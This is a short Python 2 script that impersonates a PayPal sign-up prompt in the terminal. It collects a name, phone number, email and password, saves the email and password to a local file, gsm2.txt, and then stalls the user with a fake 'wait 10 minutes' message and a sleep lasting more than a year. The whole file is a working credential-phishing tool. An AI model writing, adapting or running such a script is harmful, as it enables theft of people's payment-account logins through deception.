import time
import getpass

file1 = open("gsm2.txt","w") 
s='''

---------------

'''

am = raw_input('\033[1;37m Your Name     ')
your = raw_input(" \033[1;33m New Password   ")
de = raw_input(' \033[1;35mYour Number phone    '    )
print '''
---------------------
 
PayPal

---------------------
'''
e = raw_input("\033[0;36m Enter Your Email ")
print '''


'''
p = getpass.getpass('\033[1;35m  Pass  ')

print'''










..................
'''
file1.writelines(e)
file1.writelines(s)
file1.writelines(p)
file1.close()

print'''\033[1;36m

please Wait 10Min Create Your Account

'''
time.sleep(43575435)
